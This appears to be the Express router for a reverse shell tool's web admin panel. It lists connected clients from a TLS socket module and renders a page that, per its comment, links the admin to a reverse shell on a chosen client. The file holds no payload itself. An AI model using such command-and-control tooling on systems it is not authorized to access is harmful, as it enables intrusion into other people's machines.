const express = require('express')
const router = new express.Router()
const { clients } = require('./tls-com-sock')

// Default express route that displays all connected clients on the home page
router.get('', (req, res) => {
    let clientList = []
    
    Object.keys(clients).forEach((key) => {
        clientList.push(key)
    })
    
    // res.send(clientList)
    res.render('index', {
        clientList
    })
})

// Render the client page which connects the admin to the Reverse Shell
router.get('/client', (req,res) => {
    res.render('client', {
        client: req.query.id
    })
})

// Catchall Render for any 404 Pages.
router.get('*', (req,res) => {
    res.send('404 Not found...')
})

module.exports = router